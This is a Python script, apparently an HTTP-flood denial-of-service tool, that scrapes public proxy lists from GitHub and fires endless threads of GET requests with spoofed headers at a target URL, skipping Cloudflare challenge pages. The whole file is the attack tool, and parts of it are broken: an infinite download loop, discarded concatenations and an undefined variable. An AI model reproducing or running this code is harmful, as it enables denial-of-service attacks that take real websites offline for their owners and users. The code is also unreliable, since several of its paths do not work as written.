import requests as r, os, threading, random, click, fake_headers, time
from threading import Thread
from colorama import Fore, Style, Back
from fake_headers import Headers
version = '1.1.7 stable :.:.'

iphosts = [
    'https://wtfismyip.com/text',
    'https://ipinfo.io/ip',
    'https://ipv4.icanhazip.com/',
    'https://myexternalip.com/raw',
    'https://ifconfig.io/ip',
    'https://ipecho.net/plain'
]

global myip
myip = r.post(random.choice(iphosts)).text

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[0;33m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	LITBU = '\033[94m'
	YELLOW = '\033[3;33m'
	CYAN = '\033[0;36'
	colors = ['\033[92m', '\033[91m', '\033[0;33m']
	RAND = random.choice(colors)


def clear(): 
	if os.name == 'nt': 
		os.system('cls') 
	else: 
		os.system('clear')

def logo():
	print(Fore.BLUE + """
╔════════════════════════════════╗
║                                ║
║██████╗░██████╗░░█████╗░░██████╗║
║██╔══██╗██╔══██╗██╔══██╗██╔════╝║
║██║░░██║██║░░██║██║░░██║╚█████╗░║
║██║░░██║██║░░██║██║░░██║░╚═══██╗║
║██████╔╝██████╔╝╚█████╔╝██████╔╝║
║╚═════╝░╚═════╝░░╚════╝░╚═════╝░║
╚════════════════════════════════╝
""
[+] Developed by Ph.k3y
	""")

def check_prox(array, url):
	#myip = r.post(random.choice(iphosts)).text
	for prox in array:
		t = threading.Thread(target=check, args=(myip, prox, url))
		t.start()

def check(myip, prox, url):
	try:
		ipx = r.get(random.choice(iphosts), proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
		if ipx == myip:
			pass
		else:
			print(Fore.RED+Back.RED+"{} good proxy".format(prox)+Style.RESET_ALL)
			t = threading.Thread(target=ddos, args=(prox, url))
			t.start()
	except:
		pass


def ddos(prox, url):
	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
	colors = ["\x1B[31m", "\x1B[32m", "\x1B[33m", "\x1B[34m", "\x1B[35m", "\x1B[36m", "\x1B[37m"]
	color = random.choice(colors)
	while True:
		headers1 = Headers(headers=True).generate()
		t = threading.Thread(target=start_ddos, args=(prox, url, headers1, proxies, color))
		t.start()

def start_ddos(prox, url, headers1, proxies, color):
	try:
		s1 = r.Session()
		req1 = s1.get(url, headers=headers1, proxies=proxies)
		if req1.status_code == 200:
			if "<title>Just a moment...</title>" in req1.text:
				pass
				
			else:
				os.system('clear')
				print(Fore.BLUE + """
╔═╗╔═╗╔╗╔╔╦╗
╚═╗║╣ ║║║ ║ 
╚═╝╚═╝╝╚╝ ╩ 			
		
""" + "Target: " + url)
	except:
		pass

@click.command()
@click.option('--proxy', '-p', help="<File with a proxy>")
@click.option('--url', '-u', help="<URL>")
def main(proxy, url):
	clear()
	logo()
	if url == None:
		print(Fore.RED + "")
		url = input(Fore.WHITE + "[+] Target:  ")
	if url[:4] != "http":
		print(Fore.WHITE+"Enter the full URL (example: https://google.com/)"+Style.RESET_ALL)
		exit()
	if proxy == None:
		while True:
			req1 = r.get("https://raw.githubusercontent.com/securityscorecard/SSC-Threat-Intel-IoCs/master/KillNet-DDoS-Blocklist/proxylist.txt").text
			req2 = r.get("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt").text
			req3 = r.get("https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt").text
			req4 = r.get("https://raw.githubusercontent.com/UptimerBot/proxy-list/master/proxies/http.txt").text
			req5 = r.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt").text
			req6 = r.get("https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt").text
			req7 = r.get("https://raw.githubusercontent.com/Knownasjohnn/FacebookHack/main/proxy.txt").text
			req8 = r.get("https://raw.githubusercontent.com/AnonPrixorPH/PRIXOR-NET/main/proxy.txt").text
			req9 = r.get("https://raw.githubusercontent.com/Knownasjohnn/PyDorker/main/proxieprem.txt").text
			req1 + r.get("https://raw.githubusercontent.com/Xandermercado800/Proxy/main/proxy.txt").text
			req2 + r.get("https://raw.githubusercontent.com/Xandermercado800/Proxy/main/proxies.txt").text
			req3 + r.get("https://raw.githubusercontent.com/Xandermercado800/Ddos/main/HTTP%20proxy%20premium%20(1).txt").text
			req4 + r.get("https://raw.githubusercontent.com/AnonPrixorPH/PRIXOR-NET/main/proxy.txt").text
			req5 + r.get("https://raw.githubusercontent.com/Xandermercado800/Ggs/main/50k%20proxies.txt").text
			req6 + r.get("https://raw.githubusercontent.com/ZOXXX906/japan_ddoser/main/socks5.txt").text
			req7 + r.get("https://raw.githubusercontent.com/ZOXXX906/japan_ddoser/main/https.txt").text
			req = req1 + req2 + req3 + req4 + req5 + req6 + req7 + req8 + req9 + req1 + req2 + req3 + req4 + req5 + req6+ req7
			os.system('clear')
			print(Fore.BLUE+"""
╔═╗╔═╗╔╗╔╔╦╗
╚═╗║╣ ║║║ ║ 
╚═╝╚═╝╝╚╝ ╩ 			
			
""" + "Target: " + url)
			
	else:
		try:
			fx = open(proxy)
			os.system('clear')
			print("""
╔═╗╔═╗╔╗╔╔╦╗
╚═╗║╣ ║║║ ║ 
╚═╝╚═╝╝╚╝ ╩ 		
""" + "Target: " + url)
			check_prox(array, url)
		except FileNotFoundError:
			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
			exit()

main()